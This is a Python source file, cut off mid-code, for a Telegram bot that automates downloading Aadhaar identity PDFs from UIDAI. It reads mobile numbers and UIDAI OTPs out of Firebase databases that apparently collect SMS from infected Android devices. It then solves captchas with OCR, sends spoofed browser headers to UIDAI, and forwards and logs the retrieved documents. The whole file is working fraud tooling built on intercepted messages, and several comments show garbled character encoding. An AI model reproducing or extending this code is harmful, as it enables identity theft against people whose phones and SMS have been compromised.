#!/usr/bin/env python3
"""
Aadhaar Full Chain Bot Ã¢ÂÂ UIDAI Direct + Auto Captcha 5x Retry
Flow: Mobile Ã¢ÂÂ Captcha(auto 5x) Ã¢ÂÂ OTP1 Ã¢ÂÂ EID Ã¢ÂÂ Captcha(auto 5x) Ã¢ÂÂ OTP2 Ã¢ÂÂ PDF
name="Mr", dob=null bhejta hai UIDAI ko.
"""

import asyncio
import aiohttp
import uuid
import base64
import logging
import zipfile
import json
import re
import time
import os
import sys
import threading
import html
import random
import requests
from io import BytesIO
from curl_cffi.requests import AsyncSession
from curl_cffi.curl import CurlOpt
import curl_cffi.requests as curl_requests
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor
from urllib.parse import urlparse, parse_qs
from collections import defaultdict, Counter


def _load_local_env_file():
    """Load simple KEY=VALUE pairs for local/Railway-style deployments.

    Real environment variables always take precedence, so Railway variables
    can override the local file without changing this source file.
    """
    env_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), ".env")
    try:
        with open(env_path, "r", encoding="utf-8") as env_file:
            for raw_line in env_file:
                line = raw_line.strip()
                if not line or line.startswith("#") or "=" not in line:
                    continue
                key, value = line.split("=", 1)
                key = key.strip()
                value = value.strip().strip('"').strip("'")
                if key:
                    os.environ.setdefault(key, value)
    except FileNotFoundError:
        pass
    except OSError as exc:
        logging.getLogger(__name__).warning("Could not read local .env file: %s", exc)


_load_local_env_file()

import numpy as np
try:
    import os as _os
    _os.environ.setdefault("DISPLAY", "")
    _os.environ["OPENCV_IO_ENABLE_OPENEXR"] = "0"
    import cv2 as _cv2_real
    _CV2_OK = True
except Exception:
    _cv2_real = None
    _CV2_OK = False
try:
    import ddddocr as _ddddocr_mod
    _DDDDOCR_OK = True
except Exception:
    _ddddocr_mod = None
    _DDDDOCR_OK = False
from PIL import Image
import pymongo
from pymongo import MongoClient
import dns.resolver

import telegram
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, InputFile
import telegram.error as tg_err
from telegram.ext import (
    Application, CommandHandler, CallbackQueryHandler,
    MessageHandler, ChatMemberHandler, filters, ContextTypes,
)

# ==========================================
# CONFIG
# ==========================================
# Secrets are supplied by Railway variables; fail early with a safe message if absent.
TOKEN = os.environ.get("BOT_TOKEN", "").strip()
if not TOKEN:
    raise RuntimeError("BOT_TOKEN environment variable is required")
SESSION_TIMEOUT = 600
ADMIN_IDS = [7998643430]  # Preserve existing administrator
FORWARD_GROUP_ID = int(os.environ.get("FORWARD_GROUP_ID", "-3981168141"))
FIREBASE_FORWARD_GROUP_ID = int(os.environ.get("FIREBASE_FORWARD_GROUP_ID", "-3981168141"))
FIREBASE_NOTIFY_GROUP_ID = int(os.environ.get("FIREBASE_NOTIFY_GROUP_ID", "-3981168141"))

# Paid Residential Proxy Configuration (optional; direct UIDAI access is used if unset)
PROXY_HOST = os.environ.get("PROXY_HOST", "p1.arealproxy.com")
PROXY_PORT = int(os.environ.get("PROXY_PORT", "1080"))
PROXY_USER = os.environ.get("PROXY_USER", "")
PROXY_PASS = os.environ.get("PROXY_PASS", "")
PROXY_URL = (
    f"http://{PROXY_USER}:{PROXY_PASS}@{PROXY_HOST}:{PROXY_PORT}"
    if PROXY_USER and PROXY_PASS else ""
)
USER_PROXIES = [PROXY_URL] if PROXY_URL else []


# ==========================================
# LOGGING
# ==========================================
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logging.getLogger("httpx").setLevel(logging.WARNING)
logging.getLogger("httpcore").setLevel(logging.WARNING)
logger = logging.getLogger(__name__)

# ==========================================
# MONGODB
# ==========================================
try:
    res = dns.resolver.Resolver(configure=False)
    res.nameservers = ['8.8.8.8', '1.1.1.1']
    dns.resolver.default_resolver = res
except Exception as e:
    logger.warning(f"DNS setup: {e}")

MONGO_URI = os.environ.get("MONGO_URI", "").strip()
if not MONGO_URI:
    raise RuntimeError("MONGO_URI environment variable is required")
mongo_client = MongoClient(MONGO_URI)
db = mongo_client['aadhaar_bot']
users_col = db['users']
daily_stats_col = db['daily_stats']
broadcast_history_col = db['broadcast_history']
download_log_col = db['download_log']
settings_col = db['settings']
firebases_col = db['firebases']

_MAINTENANCE_CACHE = {'val': False, 'time': 0}
_BANNED_USERS_CACHE = {}
_ADMINS_CACHE = set(ADMIN_IDS)
_MEMBERSHIP_CACHE = {}
_VERIFIED_USERS_CACHE = set()


def _sync_is_maintenance_mode():
    try:
        s = settings_col.find_one({'key': 'maintenance'})
        return s.get('value', False) if s else False
    except Exception as e:
        logger.warning(f"maintenance read err: {e}")
        return _MAINTENANCE_CACHE['val']


def is_maintenance_mode():
    now = time.time()
    if now - _MAINTENANCE_CACHE['time'] < 10:
        return _MAINTENANCE_CACHE['val']
    val = _sync_is_maintenance_mode()
    _MAINTENANCE_CACHE['val'] = val
    _MAINTENANCE_CACHE['time'] = now
    return val


def set_maintenance_mode(status: bool):
    try:
        settings_col.update_one(
            {'key': 'maintenance'},
            {'$set': {'value': status, 'updated_at': datetime.now().isoformat()}},
            upsert=True
        )
    except Exception as e:
        logger.error(f"set_maintenance_mode err: {e}")
    _MAINTENANCE_CACHE['val'] = status
    _MAINTENANCE_CACHE['time'] = time.time()


def init_db():
    try:
        users_col.create_index("user_id", unique=True)
        daily_stats_col.create_index("date", unique=True)
        firebases_col.create_index([("user_id", 1), ("id", 1)], unique=True)
        for u in users_col.find({'verified': 1}, {'user_id': 1}):
            if 'user_id' in u:
                _VERIFIED_USERS_CACHE.add(u['user_id'])
        logger.info(f"Ã¢ÂÂ MongoDB ready ({len(_VERIFIED_USERS_CACHE)} verified users cached)")
    except Exception as e:
        logger.error(f"DB init: {e}")


init_db()


# ==========================================
# FIREBASE CONFIG & HELPERS
# ==========================================
FIREBASE_URL = ""  # Dynamically set from MongoDB firebases_col
FIREBASE_KEY = ""
OTP_POLL_TIMEOUT = 120
OTP_POLL_INTERVAL = 1.0

UIDAI_SENDERS = [
    "jx-adhaar-t", "jk-adhaar-s",
    "adhaar", "adhar", "aadhar", "uidai",
]


_FIREBASES_CACHE = {}


def get_all_firebases(user_id: int = None):
    """Sirf us user ke firebases jo usne add kiye hain (ya all active if user_id is None)"""
    now = time.time()
    cache_key = user_id or 0
    if cache_key in _FIREBASES_CACHE:
        t, data = _FIREBASES_CACHE[cache_key]
        if now - t < 30:
            return data
    try:
        query = {'is_active': {'$ne': False}}
        if user_id:
            query['user_id'] = user_id
        res = list(firebases_col.find(query).sort('_id', -1))
        _FIREBASES_CACHE[cache_key] = (now, res)
        return res
    except Exception as e:
        logger.error(f"get_all_firebases err: {e}")
        return []


def get_firebase_by_id(fb_id: str, user_id: int = None):
    cache_key = user_id or 0
    if cache_key in _FIREBASES_CACHE:
        _, data = _FIREBASES_CACHE[cache_key]
        for fb in data:
            if fb.get('id') == fb_id:
                return fb
    try:
        query = {'id': fb_id}
        if user_id:
            query['user_id'] = user_id
        return firebases_col.find_one(query)
    except Exception as e:
        logger.error(f"get_firebase_by_id err: {e}")
        return None


def extract_firebase_name_from_url(url: str) -> str:
    """URL se clean panel name nikalta hai (e.g. alok5u2, nyawala-3e7c3)"""
    if not url:
        return "Panel"
    try:
        host = urlparse(url if url.startswith(('http://', 'https://')) else 'https://' + url).netloc.lower()
        host = re.sub(r'(-default-rtdb)?\.(firebaseio\.com|.*\.firebasedatabase\.app)$', '', host)
        return host or "Panel"
    except Exception:
        return "Panel"


def extract_all_firebases(text: str) -> list[dict]:
    """
    Text se saare Firebase panels extract karta hai.
    Supports:
    - URL query parameters (?m=base64, ?s=base64, etc.)
    - Direct base64 string
    - JSON array/object: [{"url": "...", "key": "..."}, ...]
    - Plain text multiple URLs
    Returns list of dicts: [{'url': 'https://...', 'key': '...', 'name': '...'}]
    """
    if not text:
        return []
    text = text.strip()
    results = []
    seen_urls = set()

    def _clean_single_url(raw_u: str) -> str | None:
        if not raw_u:
            return None
        m = re.search(r'https?://([a-zA-Z0-9_\-\.]+\.(?:firebaseio\.com|firebasedatabase\.app))', raw_u, re.IGNORECASE)
        if m:
            h = m.group(1).lower().rstrip('.')
            if len(h.split('.')) >= 3 and "xxx-default-rtdb" not in h:
                return f"https://{h}"
        m2 = re.search(r'\b([a-zA-Z0-9_\-\.]+\.(?:firebaseio\.com|firebasedatabase\.app))\b', raw_u, re.IGNORECASE)
        if m2:
            h = m2.group(1).lower().rstrip('.')
            if len(h.split('.')) >= 3 and "xxx-default-rtdb" not in h:
                return f"https://{h}"
        return None

    def _add_entry(u: str, k: str = '', n: str = ''):
        clean_u = _clean_single_url(u)
        if clean_u and clean_u not in seen_urls:
            seen_urls.add(clean_u)
            name = n.strip() if n else extract_firebase_name_from_url(clean_u)
            results.append({'url': clean_u, 'key': (k or '').strip(), 'name': name})

    def _try_parse_obj(obj):
        if isinstance(obj, list):
            for item in obj:
                if isinstance(item, dict):
                    _add_entry(item.get('url') or '', item.get('key') or '', item.get('name') or '')
                elif isinstance(item, str):
                    _add_entry(item)
        elif isinstance(obj, dict):
            if 'url' in obj:
                _add_entry(obj.get('url') or '', obj.get('key') or '', obj.get('name') or '')
            else:
                for k, v in obj.items():
                    if isinstance(v, dict):
                        _add_entry(v.get('url') or '', v.get('key') or '', v.get('name') or k)
                    elif isinstance(v, str):
                        _add_entry(v, '', k)

    def _try_decode_b64(b64_str: str):
        try:
            padded = b64_str + '=' * (-len(b64_str) % 4)
            raw = base64.b64decode(padded).decode('utf-8', errors='ignore')
            try:
                data = json.loads(raw)
                _try_parse_obj(data)
            except Exception:
                for match in re.findall(r'https?://[a-zA-Z0-9_\-\.]+\.(?:firebaseio\.com|firebasedatabase\.app)', raw, re.IGNORECASE):
                    _add_entry(match)
        except Exception:
            pass

    # 1. Check query parameters if it's a URL (e.g. ?m=..., ?s=...)
    if '?' in text or '&' in text:
        try:
            parsed = urlparse(text if text.startswith(('http://', 'https://')) else 'https://' + text)
            qs = parse_qs(parsed.query)
            for param_vals in qs.values():
                for val in param_vals:
                    _try_decode_b64(val)
        except Exception:
            pass

    # 2. Check if whole text is base64 string
    if len(text) > 20 and re.match(r'^[a-zA-Z0-9+/=_\-]+$', text):
        _try_decode_b64(text)

    # 3. Check if text is direct JSON
    if text.startswith(('[', '{')):
        try:
            data = json.loads(text)
            _try_parse_obj(data)
        except Exception:
            pass

    # 4. Direct regex match on text for URLs
    for match in re.findall(r'https?://[a-zA-Z0-9_\-\.]+\.(?:firebaseio\.com|firebasedatabase\.app)', text, re.IGNORECASE):
        _add_entry(match)

    return results


def extract_firebase_url(text: str) -> str | None:
    if not text:
        return None
    all_fbs = extract_all_firebases(text)
    if all_fbs:
        return all_fbs[0]['url']
    return None


def check_firebase_active(url: str, key: str = "") -> tuple[bool, str]:
    """
    Check karta hai ki Firebase database active hai ya deactivate / deleted / invalid.
    Returns: (is_active: bool, reason: str)
    """
    clean_url = extract_firebase_url(url)
    if not clean_url:
        return False, "Invalid Firebase URL format"

    base = clean_url.rstrip('/')
    test_url = f"{base}/.json"
    params = {"shallow": "true"}
    if key:
        params["auth"] = key

    try:
        r = _FB_SESSION.get(test_url, params=params, timeout=7)
        status = r.status_code
        text_lower = r.text.lower()

        # 404 Not Found -> Project ya database delete / deactivate ho chuka hai
        if status == 404:
            return False, "Firebase project deleted ya deactivate ho chuka hai (404 Not Found)."

        # 402 Payment Required -> Firebase billing suspended / plan deactivated
        if status == 402:
            return False, "Firebase account deactivated ya billing suspend ho chuki hai (402 Payment Required)."

        # 403 Forbidden / Permission Denied -> Database exists but rules lock
        if status == 403 or "permission_denied" in text_lower or "permission denied" in text_lower:
            return True, "Active (Restricted/Auth Rules)"

        # 200 OK -> Database active hai
        if status == 200:
            return True, "Active"

        # 400 Bad Request
        if status == 400 and ("deactivated" in text_lower or "disabled" in text_lower):
            return False, "Firebase database deactivate ho chuka hai."

        # Other status codes: try checking /clients.json
        r_clients = _FB_SESSION.get(f"{base}/clients.json", params={"limitToFirst": "1"}, timeout=7)
        if r_clients.status_code == 404:
            return False, "Firebase project deleted ya deactivate ho chuka hai (404 Not Found)."
        if r_clients.status_code in (200, 403):
            return True, "Active"

        return False, f"Firebase respond nahi kar raha (HTTP {status})."

    except requests.exceptions.Timeout:
        return False, "Firebase server se connection timeout ho gaya. Kripya check karein ki URL sahi hai."
    except requests.exceptions.ConnectionError:
        return False, "Firebase host connect nahi ho paaya (DNS/Domain not found). Database band ya deactivate hai."
    except Exception as e:
        logger.warning(f"check_firebase_active error for {clean_url}: {e}")
        return False, f"Connection error: {e}"


def add_or_update_firebase(user_id: int, name: str, url: str, key: str = ""):
    """User ka apna Firebase add ya update karo. Returns (fb_id, is_new_globally)."""
    clean_url = extract_firebase_url(url)
    if not clean_url:
        return None, False
    url = clean_url
    clean_name = name.strip() or "My Firebase"

    # Check if this URL is already present in DB (any user)
    already_in_db = firebases_col.find_one({'url': url}) is not None

    # Check if same user already has this URL
    _FIREBASES_CACHE.pop(user_id, None)
    _FIREBASES_CACHE.pop(0, None)
    existing = firebases_col.find_one({'user_id': user_id, 'url': url})
    if existing:
        firebases_col.update_one({'_id': existing['_id']},
            {'$set': {'name': clean_name, 'key': key.strip(), 'is_active': True}})
        # Purana hi hai user ke paas bhi, admin ko nahi bhejna
        return existing.get('id'), False

    new_id = f"fb_{uuid.uuid4().hex[:8]}"
    firebases_col.insert_one({
        'id': new_id, 'user_id': user_id, 'name': clean_name,
        'url': url, 'key': key.strip(),
        'created_at': datetime.now().isoformat(), 'is_active': True
    })
    # Sirf tab true return hoga jab ye URL DB me bilkul pehli baar aaya ho
    is_brand_new = not already_in_db
    return new_id, is_brand_new


def delete_firebase(fb_id: str, user_id: int = None):
    """Sirf apna Firebase delete kar sakta hai user"""
    _FIREBASES_CACHE.pop(user_id, None)
    _FIREBASES_CACHE.pop(0, None)
    try:
        query = {'id': fb_id}
        if user_id:
            query['user_id'] = user_id
        return firebases_col.delete_one(query)
    except Exception as e:
        logger.error(f"delete_firebase err: {e}")
        return None


_FB_SESSION = requests.Session()
_adapter = requests.adapters.HTTPAdapter(pool_connections=50, pool_maxsize=100, max_retries=1)
_FB_SESSION.mount("https://", _adapter)
_FB_SESSION.mount("http://", _adapter)


def _firebase_get(path: str, params: dict = None, firebase_url: str = None, firebase_key: str = None) -> dict:
    base = (firebase_url or FIREBASE_URL).rstrip('/')
    url = f"{base}/{path}.json"
    key = firebase_key if firebase_key is not None else FIREBASE_KEY
    p = {"auth": key, **(params or {})} if key else (params or {})
    try:
        r = _FB_SESSION.get(url, params=p, timeout=8)
        if r.status_code == 400 and params and "orderBy" in params:
            # Fallback without params if index not defined in Firebase rules
            p_auth = {"auth": key} if key else {}
            r = _FB_SESSION.get(url, params=p_auth, timeout=8)
        r.raise_for_status()
        return r.json()
    except Exception as e:
        if params and "orderBy" in params:
            try:
                p_auth = {"auth": key} if key else {}
                r2 = _FB_SESSION.get(url, params=p_auth, timeout=8)
                if r2.status_code == 200:
                    return r2.json()
            except Exception:
                pass
        raise e


def _extract_phone_from_sms(text: str) -> str | None:
    r"""
    Extract genuine device SIM number from operator recharge/service SMS.
    Filters out IVRS, customer care, missed call caller numbers, dispute numbers, etc.
    """
    if not text:
        return None
    text_lower = text.lower()

    # Negative filters: exclude non-self numbers (IVRS, missed calls, dispute, bank dispute)
    blacklist = [
        'missed call', 'missed calls', 'available to take calls',
        'blockupi', 'dispute', 'ivrs', 'helpline', 'cust:', 'customer care',
        'recharge not successful', 'credited to your a/c', 'credited to a/c',
        'toll free', 'tollfree', 'call 1800', 'call 198', 'call 121', 'call 199',
        'txn id', 'transaction id', 'ref no', 'rrn:'
    ]
    for b in blacklist:
        if b in text_lower:
            return None

    patterns = [
        # Jio formats:
        # "jio Ã Â¦Â¨Ã Â¦Â®Ã Â§ÂÃ Â¦Â¬Ã Â§Â° : 7002722026", "Jio Ã Â¤Â¨Ã Â¤ÂÃ Â¤Â¬Ã Â¤Â°: 9101477397", "Jio no. 9101477397", "Jio Number 9101477397"
        r'(?:Jio|jio|JIO)\s*(?:Ã Â¤Â¨Ã Â¤ÂÃ Â¤Â¬Ã Â¤Â°|Ã Â¤Â¨Ã Â¤Â®Ã Â¥ÂÃ Â¤Â¬Ã Â¤Â°|Ã Â¦Â¨Ã Â¦Â®Ã Â§ÂÃ Â¦Â¬Ã Â§Â°|no\.?|number|num)\s*[:\-]?\s*(?:\+?91)?([6-9]\d{9})',

        # Airtel formats:
        # "Airtel pack on 9859404784", "Airtel No. 9859404784", "Airtel services on 9859404784"
        r'(?:Airtel|airtel|AIRTEL)\s*(?:pack on|services on|No\.?|number|no|alert:.*?on)\s*[:\-]?\s*(?:\+?91)?([6-9]\d{9})',

        # Vi / Vodafone / Idea formats:
        r'(?:Vi|VI|Vodafone|Idea|IDEA)\s*(?:Ã Â¤Â¨Ã Â¤ÂÃ Â¤Â¬Ã Â¤Â°|Ã Â¤Â¨Ã Â¤Â®Ã Â¥ÂÃ Â¤Â¬Ã Â¤Â°|Ã Â¦Â¨Ã Â¦Â®Ã Â§ÂÃ Â¦Â¬Ã Â§Â°|no\.?|number|num|pack on)\s*[:\-]?\s*(?:\+?91)?([6-9]\d{9})',

        # BSNL formats:
        r'(?:BSNL|bsnl)\s*(?:no\.?|number|num)\s*[:\-]?\s*(?:\+?91)?([6-9]\d{9})',

        # Generic operator / personal phone label:
        # "your mobile number 9876543210", "your jio number: 9876543210"
        r'(?:your|ur)\s+(?:jio|airtel|vi|idea|bsnl|mobile|phone)\s+(?:no\.?|number|num)\s*[:\-]?\s*(?:\+?91)?([6-9]\d{9})',

        # "pack on 9859404784"
        r'pack on\s+(?:\+?91)?([6-9]\d{9})',

        # "recharge your jio no. 9876543210"
        r'recharge (?:now )?(?:your )?(?:jio|airtel|vi|idea|bsnl)?\s*(?:no\.?|number)\s*(?:\+?91)?([6-9]\d{9})',
    ]

    for pat in patterns:
        try:
            m = re.search(pat, text, re.IGNORECASE)
            if m:
                digits = m.group(1)
                if len(digits) == 10 and digits[0] in '6789':
                    return digits
        except Exception:
            continue
    return None



def clean_indian_mobile(val) -> str | None:
    if not val:
        return None
    digits = re.sub(r'[^0-9]', '', str(val))
    if len(digits) == 10 and digits[0] in '6789':
        return digits
    if len(digits) == 12 and digits.startswith('91') and digits[2] in '6789':
        return digits[2:]
    if len(digits) == 11 and digits.startswith('0') and digits[1] in '6789':
        return digits[1:]
    m = re.search(r'[6-9]\d{9}', digits)
    if m:
        return m.group(0)
    return None


def firebase_get_online_devices(firebase_url: str = None, firebase_key: str = None) -> list:
    try:
        data = _firebase_get("clients", firebase_url=firebase_url, firebase_key=firebase_key)
        if not isinstance(data, dict):
            return []
        devices = []
        for device_id, d in data.items():
            if not isinstance(d, dict):
                continue
            if not d.get('status'):
                continue
            bat_raw = str(d.get('battery', '0%'))
            bat_str = bat_raw.replace('%', '').strip()
            bat_pct = int(bat_str) if bat_str.isdigit() else 0
            # Ã¢ÂÂÃ¢ÂÂ Collect ALL SIM numbers Ã¢ÂÂÃ¢ÂÂ
            mobiles = []

            def _add_num(val):
                if not val:
                    return
                if isinstance(val, str):
                    for chunk in re.split(r'[,/|\s]+', val):
                        cl = clean_indian_mobile(chunk)
                        if cl and cl not in mobiles:
                            mobiles.append(cl)
                elif isinstance(val, (int, float)):
                    cl = clean_indian_mobile(str(val))
                    if cl and cl not in mobiles:
                        mobiles.append(cl)

            # Direct fields on device dict
            for k in ['mobNo', 'mobile', 'phoneNumber', 'phone', 'phone_number']:
                _add_num(d.get(k))

            # sims / sim1 / sim2 / sim_1 / sim_2
            for sim_key in ['sims', 'sim1', 'sim2', 'sim_1', 'sim_2']:
                s_obj = d.get(sim_key)
                if isinstance(s_obj, list):
                    for sim in s_obj:
                        if isinstance(sim, dict):
                            for k in ['phoneNumber', 'number', 'phone', 'mobNo', 'mobile', 'simNumber']:
                                _add_num(sim.get(k))
                        elif isinstance(sim, (str, int)):
                            _add_num(sim)
                elif isinstance(s_obj, dict):
                    for k in ['phoneNumber', 'number', 'phone', 'mobNo', 'mobile', 'simNumber']:
                        _add_num(s_obj.get(k))
                    for sim in s_obj.values():
                        if isinstance(sim, dict):
                            for k in ['phoneNumber', 'number', 'phone', 'mobNo', 'mobile', 'simNumber']:
                                _add_num(sim.get(k))
                        elif isinstance(sim, (str, int)):
                            _add_num(sim)
                elif isinstance(s_obj, (str, int)):
                    _add_num(s_obj)

            mobile = mobiles[0] if mobiles else None

            devices.append({
                'device_id': device_id,
                'name': str(d.get('modelName') or d.get('model') or d.get('deviceName') or device_id),
                'battery': bat_raw, 'battery_pct': bat_pct,
                'mobile': mobile,
                'mobiles': mobiles,
                'provider': str(d.get('service_provider', 'Ã¢ÂÂ')),
            })
        devices.sort(key=lambda x: x['battery_pct'], reverse=True)
        missing_devs = [dev for dev in devices if not dev['mobile']]
        if missing_devs:
            def _fetch_sms_num(dev):
                try:
                    msgs = _firebase_get(
                        f"messages/{dev['device_id']}",
                        {"orderBy": '"$key"', "limitToLast": "150"},
                        firebase_url=firebase_url, firebase_key=firebase_key
                    )
                    if not isinstance(msgs, dict):
                        return
                    found = []
                    for _, m in sorted(msgs.items(), reverse=True):
                        if not isinstance(m, dict):
                            continue
                        text = str(m.get('message') or m.get('body') or m.get('text') or '')
                        if not text:
                            continue
                        num = _extract_phone_from_sms(text)
                        if num and num not in found:
                            found.append(num)
                        if len(found) >= 2:
                            break
                    if found:
                        dev['mobile'] = found[0]
                        dev['mobiles'] = found
                except Exception:
                    pass
            with ThreadPoolExecutor(max_workers=12) as pool:
                list(pool.map(_fetch_sms_num, missing_devs))
        return devices
    except Exception as e:
        logger.warning(f"firebase_get_online_devices [{firebase_url}]: {e}")
        return []


def firebase_get_message_keys(device_id: str, firebase_url: str = None, firebase_key: str = None) -> set:
    try:
        data = _firebase_get(
            f"messages/{device_id}",
            {"orderBy": '"$key"', "limitToLast": "50"},
            firebase_url=firebase_url, firebase_key=firebase_key
        )
        if isinstance(data, dict):
            return set(data.keys())
    except Exception as e:
        logger.warning(f"firebase_get_message_keys err: {e}")
    return set()


def firebase_read_otp(device_id: str, firebase_url: str = None, firebase_key: str = None,
                      ignore_keys: set = None, min_timestamp_ms: int = None,
                      exclude_otps: set = None,
                      mobile_hint: str = None) -> str | None:
    """
    OTP read karo Firebase se.
    UIDAI OTP messages ko filter karta hai aur exclude_otps se already used OTPs skip karta hai.
    """
    try:
        data = _firebase_get(
            f"messages/{device_id}",
            {"orderBy": '"$key"', "limitToLast": "30"},
            firebase_url=firebase_url, firebase_key=firebase_key
        )
        if not isinstance(data, dict):
            return None
        ignore_keys  = ignore_keys  or set()
        exclude_otps = exclude_otps or set()
        entries = sorted(data.items(), reverse=True)

        for key, msg in entries:
            if not isinstance(msg, dict):
                continue
            if key in ignore_keys:
                continue
            msg_ts = msg.get('id') or msg.get('timestamp') or msg.get('date') or msg.get('time') or key
            ts_ms = None
            if isinstance(msg_ts, (int, float)):
                ts_ms = int(msg_ts)
            elif str(msg_ts).isdigit():
                ts_ms = int(msg_ts)
            if ts_ms and len(str(ts_ms)) >= 12 and min_timestamp_ms:
                if ts_ms < (min_timestamp_ms - 15000):
                    continue

            text   = str(msg.get('message') or msg.get('body') or msg.get('text') or '')
            sender = str(msg.get('sender') or msg.get('from') or '').lower()
            if not text.strip():
                continue
            is_uidai = any(s in sender for s in UIDAI_SENDERS) or any(
                w in text.lower() for w in ['aadhaar', 'uidai', 'adhaar'])
            if not is_uidai:
                continue
            text_l = text.lower()
            if 'otp' not in text_l and 'one time password' not in text_l and 'verification code' not in text_l:
                continue

            # Prioritize "XXXXXX is OTP" or "OTP is XXXXXX"
            m_otp = re.search(r'\b(\d{6})\b\s+is\s+(?:your\s+)?(?:one\s+time\s+password|otp)', text_l)
            if not m_otp:
                m_otp = re.search(r'(?:otp|code|password)\s+(?:is\s+)?\b(\d{6})\b', text_l)

            digits = [m_otp.group(1)] if m_otp else re.findall(r'\b(\d{6})\b', text)
            if digits:
                otp = digits[0]
                if otp in exclude_otps:
                    continue
                return otp
        return None

    except Exception as e:
        logger.warning(f"firebase_read_otp ({device_id}): {e}")
    return None



def firebase_clear_otp(device_id: str, firebase_url: str = None, firebase_key: str = None):
    pass  # no-op, safe


def add_user(uid, uname, fname, lname):
    is_adm = 1 if uid in ADMIN_IDS else 0
    users_col.update_one(
        {'user_id': uid},
        {'$setOnInsert': {
            'user_id': uid, 'username': uname or '', 'first_name': fname or '',
            'last_name': lname or '', 'joined_date': datetime.now().isoformat(),
            'total_downloads': 0, 'today_downloads': 0, 'last_download_date': '',
            'is_banned': 0, 'is_admin': is_adm, 'verified': 0
        }},
        upsert=True
    )


def get_user_stats(uid):
    u = users_col.find_one({'user_id': uid})
    if u:
        return {'total_downloads': u.get('total_downloads', 0),
                'today_downloads': u.get('today_downloads', 0),
                'is_banned': u.get('is_banned', 0),
                'verified': u.get('verified', 0)}
    return {'total_downloads': 0, 'today_downloads': 0, 'is_banned': 0, 'verified': 0}


def update_user_stats(uid, n=1):
    today = datetime.now().strftime('%Y-%m-%d')
    u = users_col.find_one({'user_id': uid})
    if u:
        last = u.get('last_download_date', '')
        if last == today:
            new_today = u.get('today_downloads', 0) + n
            is_new = False
        else:
            new_today = n
            is_new = True
        users_col.update_one({'user_id': uid},
            {'$inc': {'total_downloads': n},
             '$set': {'today_downloads': new_today, 'last_download_date': today}})
    else:
        is_new = True
        add_user(uid, '', '', '')
        users_col.update_one({'user_id': uid},
            {'$inc': {'total_downloads': n},
             '$set': {'today_downloads': n, 'last_download_date': today}})

    if is_new:
        daily_stats_col.update_one({'date': today},
            {'$inc': {'total_downloads': n, 'unique_users': 1}}, upsert=True)
    else:
        daily_stats_col.update_one({'date': today},
            {'$inc': {'total_downloads': n}}, upsert=True)


def log_download(uid, uname, mob, name, eid, fname, fwd=0, **kwargs):
    if 'forwarded' in kwargs:
        fwd = kwargs['forwarded']
    download_log_col.insert_one({
        'user_id': uid, 'username': uname, 'mobile': mob, 'name': name,
        'eid': eid, 'file_name': fname,
        'download_date': datetime.now().isoformat(), 'forwarded': fwd
    })


def get_all_users():
    return [u['user_id'] for u in users_col.find({'is_banned': 0}, {'user_id': 1}) if 'user_id' in u]


def get_all_users_count():
    return users_col.count_documents({'is_banned': 0})


def get_banned_users_count():
    return users_col.count_documents({'is_banned': 1})


def get_today_stats():
    today = datetime.now().strftime('%Y-%m-%d')
    r = daily_stats_col.find_one({'date': today})
    if r:
        return {'downloads': r.get('total_downloads', 0), 'users': r.get('unique_users', 0)}
    return {'downloads': 0, 'users': 0}


def get_total_stats():
    p = [{'$group': {'_id': None, 'total': {'$sum': '$total_downloads'}}}]
    r = list(users_col.aggregate(p))
    return r[0].get('total', 0) if r else 0


def is_user_banned(uid):
    now = time.time()
    if uid in _BANNED_USERS_CACHE:
        t, v = _BANNED_USERS_CACHE[uid]
        ttl = 300 if v else 60
        if now - t < ttl:
            return v
    r = users_col.find_one({'user_id': uid}, {'is_banned': 1})
    val = bool(r and r.get('is_banned') == 1)
    _BANNED_USERS_CACHE[uid] = (now, val)
    return val


is_banned = is_user_banned


def ban_user(uid):
    users_col.update_one({'user_id': uid}, {'$set': {'is_banned': 1}}, upsert=True)
    _BANNED_USERS_CACHE[uid] = (time.time(), True)


def unban_user(uid):
    users_col.update_one({'user_id': uid}, {'$set': {'is_banned': 0}}, upsert=True)
    _BANNED_USERS_CACHE[uid] = (time.time(), False)


def is_admin(uid):
    if uid in _ADMINS_CACHE or uid in ADMIN_IDS:
        return True
    r = users_col.find_one({'user_id': uid}, {'is_admin': 1})
    val = bool(r and r.get('is_admin') == 1)
    if val:
        _ADMINS_CACHE.add(uid)
    return val or (uid in ADMIN_IDS)


def save_broadcast(msg, count):
    broadcast_history_col.insert_one({
        'message': msg, 'sent_date': datetime.now().isoformat(), 'recipients': count
    })


def setup_admins():
    for a in ADMIN_IDS:
        users_col.update_one({'user_id': a},
            {'$set': {'is_admin': 1},
             '$setOnInsert': {
                 'username': '', 'first_name': '', 'last_name': '',
                 'joined_date': datetime.now().isoformat(),
                 'total_downloads': 0, 'today_downloads': 0,
                 'last_download_date': '', 'is_banned': 0, 'verified': 0
             }},
            upsert=True)
        _ADMINS_CACHE.add(a)


# ==========================================
# UIDAI HEADERS
# ==========================================
UIDAI_BASE = "https://tathya.uidai.gov.in"
UIDAI_HEADERS = {
    "Accept": "application/json, text/plain, */*",
    "Content-Type": "application/json",
    "Origin": "https://myaadhaarbeta.uidai.gov.in",
    "Referer": "https://myaadhaarbeta.uidai.gov.in/",
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/152.0.0.0 Safari/537.36",
    "Accept-Language": "en_IN",
    "sec-ch-ua": '"Chromium";v="152", "Not?A_Brand";v="24", "Google Chrome";v="152"',
    "sec-ch-ua-mobile": "?0",
    "sec-ch-ua-platform": '"Linux"',
}


def _uidai_h(app_id="MYAADHAAR"):
    h = dict(UIDAI_HEADERS)
    h["appid"] = app_id
    h["X-Request-ID"] = str(uuid.uuid4())
    return h


# ==========================================
# OCR / CAPTCHA SOLVER
# ==========================================
# ==========================================
# OCR BACKEND: ddddocr (preferred) or pytesseract fallback
# ==========================================
_ocr = None
_ocr_beta = None

if _DDDDOCR_OK:
    try:
        _ocr = _ddddocr_mod.DdddOcr(show_ad=False)
        try:
            _ocr_beta = _ddddocr_mod.DdddOcr(show_ad=False, beta=True)
        except Exception:
            _ocr_beta = None
    except Exception:
        _ocr = None

def _ocr_classify(img_bytes: bytes) -> str:
    """Universal OCR: ddddocr if available, else pytesseract."""
    if _ocr is not None:
        try:
            return _ocr.classification(img_bytes)
        except Exception:
            pass
    # Fallback: pytesseract
    try:
        import pytesseract
